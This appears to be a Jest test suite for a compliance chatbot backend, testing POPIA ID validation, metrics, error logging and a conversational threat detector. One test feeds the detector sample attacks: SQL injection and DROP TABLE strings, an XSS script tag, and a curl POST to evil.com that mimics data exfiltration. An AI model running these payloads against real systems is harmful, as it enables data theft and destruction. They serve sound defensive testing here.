// tests/enterprise-validation.spec.ts
import { jest } from '@jest/globals';
import { promisify } from 'util';

// Mock external dependencies for testing
jest.mock('../server/conversational-error-logger', () => ({
  conversationalErrorLogger: {
    logConversationalError: jest.fn(),
  }
}));

jest.mock('../server/conversational-threat-detection', () => ({
  conversationalThreatDetector: {
    analyzeConversationForThreats: jest.fn().mockResolvedValue({
      threatLevel: 'low',
      confidence: 0.8,
      threats: [],
      requiresAction: false
    })
  }
}));

// Mock prom-client for metrics testing
jest.mock('prom-client', () => ({
  collectDefaultMetrics: jest.fn(),
  Registry: jest.fn().mockImplementation(() => ({
    registerMetric: jest.fn(),
    metrics: jest.fn().mockResolvedValue('# Mock metrics output')
  })),
  Counter: jest.fn().mockImplementation(() => ({
    labels: jest.fn().mockReturnThis(),
    inc: jest.fn()
  })),
  Gauge: jest.fn().mockImplementation(() => ({
    labels: jest.fn().mockReturnThis(),
    set: jest.fn()
  })),
  Histogram: jest.fn().mockImplementation(() => ({
    labels: jest.fn().mockReturnThis(),
    observe: jest.fn()
  }))
}));

describe('Enterprise Compliance Framework Validation', () => {
  describe('POPIA Compliance Validator', () => {
    it('should validate South African ID numbers correctly', async () => {
      // Import after mocking to get clean access
      const { complianceValidator } = await import('../server/compliance-validator');

      const testCases = [
        { id: '9001015000082', expected: true }, // Valid SA ID
        { id: '9001015000083', expected: false }, // Invalid checksum
        { id: '1234567890123', expected: false }, // Invalid format
        { id: '90010150000', expected: false }, // Too short
      ];

      for (const testCase of testCases) {
        const result = await complianceValidator.handleDataSubjectRequest(
          'access',
          'test-user',
          testCase.id
        );

        if (testCase.expected) {
          expect(result.success).toBe(true);
        } else {
          expect(result.success).toBe(false);
          expect(result.message).toContain('Invalid South African ID');
        }
      }
    });

    it('should validate data collection compliance', async () => {
      const { complianceValidator } = await import('../server/compliance-validator');

      // Test data collection with consent
      const compliantContext = {
        purpose: 'legitimate business purposes',
        dataTypes: ['personal'],
        consentGiven: true,
        consentTimestamp: new Date()
      };

      const result1 = await complianceValidator.validateCompliance('data_collection', compliantContext);
      expect(result1.isCompliant).toBe(true);

      // Test data collection without consent
      const nonCompliantContext = {
        purpose: 'marketing communications',
        dataTypes: ['personal'],
        consentGiven: false
      };

      const result2 = await complianceValidator.validateCompliance('data_collection', nonCompliantContext);
      expect(result2.isCompliant).toBe(false);
      expect(result2.violations.length).toBeGreaterThan(0);
    });

    it('should handle data deletion requests', async () => {
      const { complianceValidator } = await import('../server/compliance-validator');

      const deletionContext = {
        deletionRequested: true,
        deletionRequestDate: new Date(Date.now() - 24 * 60 * 60 * 1000), // 1 day ago
        deletionCompleted: false
      };

      const result = await complianceValidator.validateCompliance('data_deletion', deletionContext);
      expect(result.isCompliant).toBe(false);
      expect(result.violations.length).toBeGreaterThan(0);
      expect(result.violations[0].regulation).toBe('POPIA');
    });
  });

  describe('Conversational Metrics System', () => {
    it('should initialize metrics collectors successfully', async () => {
      const { ConversationalMetricsCollector } = await import('../server/monitoring/conversational-metrics');

      const metricsCollector = new ConversationalMetricsCollector();
      expect(metricsCollector).toBeDefined();
      expect(typeof metricsCollector.recordConversationStart).toBe('function');
      expect(typeof metricsCollector.recordConversationComplete).toBe('function');
    });

    it('should record conversation metrics without errors', async () => {
      const { ConversationalMetricsCollector } = await import('../server/monitoring/conversational-metrics');

      const metricsCollector = new ConversationalMetricsCollector();

      // Test conversation start recording
      const conversationMetrics = {
        conversationId: 'test-conversation-123',
        userId: 'test-user-456',
        channel: 'whatsapp' as const
      };

      expect(() => {
        metricsCollector.recordConversationStart(conversationMetrics);
      }).not.toThrow();

      // Test conversation completion recording
      const completeMetrics = {
        conversationId: 'test-conversation-123',
        userId: 'test-user-456',
        channel: 'whatsapp' as const,
        complianceType: 'annual-return',
        result: 'completed' as const,
        durationSeconds: 45,
        interactionsCount: 12,
        aiConfidence: 0.85
      };

      expect(() => {
        metricsCollector.recordConversationComplete(completeMetrics);
      }).not.toThrow();
    });

    it('should generate metrics output', async () => {
      const { ConversationalMetricsCollector } = await import('../server/monitoring/conversational-metrics');

      const metricsCollector = new ConversationalMetricsCollector();
      const metrics = await metricsCollector.getMetrics();

      expect(metrics).toContain('# HELP');
      expect(metrics).toContain('# TYPE');
    });
  });

  describe('Conversational Threat Detection', () => {
    it('should analyze conversations for threats', async () => {
      const { conversationalThreatDetector } = await import('../server/conversational-threat-detection');

      const conversation = [
        { sender: 'user', content: 'SELECT * FROM users', timestamp: new Date() },
        { sender: 'assistant', content: 'I cannot execute database queries', timestamp: new Date() }
      ];

      const result = await conversationalThreatDetector.analyzeConversationForThreats(conversation);

      expect(result).toHaveProperty('threatLevel');
      expect(result).toHaveProperty('confidence');
      expect(result).toHaveProperty('threats');
      expect(result).toHaveProperty('requiresAction');
    });

    it('should detect injection attacks in messages', async () => {
      const { conversationalThreatDetector } = await import('../server/conversational-threat-detection');

      const injectionAttempts = [
        "SELECT * FROM users WHERE id = '1' OR '1'='1'",
        '<script>alert("XSS")</script>',
        "'; DROP TABLE users; --",
        'curl -X POST https://evil.com/data'
      ];

      for (const attempt of injectionAttempts) {
        const detected = await conversationalThreatDetector.detectInjectionAttacks(attempt);
        expect(detected).toBe(true);
      }

      const safeMessages = [
        'I need to file my annual return',
        'My company registration number is 2001/123456/07',
        'Please help me with beneficial ownership'
      ];

      for (const message of safeMessages) {
        const detected = await conversationalThreatDetector.detectInjectionAttacks(message);
        expect(detected).toBe(false);
      }
    });

    it('should enforce rate limiting for conversational requests', async () => {
      const { conversationalThreatDetector } = await import('../server/conversational-threat-detection');

      // Test normal rate limiting
      const result1 = await conversationalThreatDetector.rateLimitConversationalRequests(
        'user-123',
        'conversation-456',
        'whatsapp'
      );

      expect(result1.allowed).toBe(true);

      // Test rate limiting would apply multiple rapid requests
      // (In practice, this would need multiple calls and timing)
      expect(result1).toHaveProperty('allowed');
    });
  });

  describe('Conversational Error Logger', () => {
    it('should initialize and configure logging', async () => {
      const { conversationalErrorLogger } = await import('../server/conversational-error-logger');

      expect(conversationalErrorLogger).toBeDefined();
      expect(typeof conversationalErrorLogger.logConversationalError).toBe('function');
    });

    it('should handle error logging without throwing', async () => {
      const { conversationalErrorLogger } = await import('../server/conversational-error-logger');

      const testError = {
        conversationId: 'test-conv-123',
        userId: 'test-user-456',
        channel: 'webchat' as const,
        error: new Error('Test compliance error'),
        context: {
          step: 'data-collection',
          userInput: 'Test input with sensitive data',
          complianceType: 'personal-data',
          timestamp: new Date()
        },
        severity: 'medium' as const
      };

      // Should not throw during error logging
      await expect(conversationalErrorLogger.logConversationalError(testError)).resolves.toBeUndefined();
    });

    it('should provide access to logger and metrics', async () => {
      const { conversationalErrorLogger } = await import('../server/conversational-error-logger');

      expect(conversationalErrorLogger.getLogger()).toBeDefined();
      expect(typeof conversationalErrorLogger.getMetrics).toBe('function');
    });
  });

  describe('Integration Testing', () => {
    it('should integrate all enterprise components', async () => {
      // Test that all modules can be imported together
      const [
        { ConversationalMetricsCollector },
        { conversationalThreatDetector },
        { conversationalErrorLogger },
        { complianceValidator }
      ] = await Promise.all([
        import('../server/monitoring/conversational-metrics'),
        import('../server/conversational-threat-detection'),
        import('../server/conversational-error-logger'),
        import('../server/compliance-validator')
      ]);

      // All components should be properly exported
      expect(ConversationalMetricsCollector).toBeDefined();
      expect(conversationalThreatDetector).toBeDefined();
      expect(conversationalErrorLogger).toBeDefined();
      expect(complianceValidator).toBeDefined();

      // Test a complete workflow integration
      const metricsCollector = new ConversationalMetricsCollector();

      const testConversation = {
        conversationId: 'integration-test-123',
        userId: 'test-user',
        channel: 'whatsapp' as const
      };

      // Start conversation tracking
      metricsCollector.recordConversationStart(testConversation);

      // Test compliance validation
      const complianceResult = await complianceValidator.validateCompliance('data_collection', {
        purpose: 'legitimate business purposes',
        dataTypes: ['business'],
        consentGiven: true
      });

      // Complete conversation with metrics
      metricsCollector.recordConversationComplete({
        ...testConversation,
        result: 'completed',
        durationSeconds: 30,
        interactionsCount: 8,
        complianceViolations: complianceResult.violations.length
      });

      expect(complianceResult.isCompliant).toBe(true);
    });
  });
});
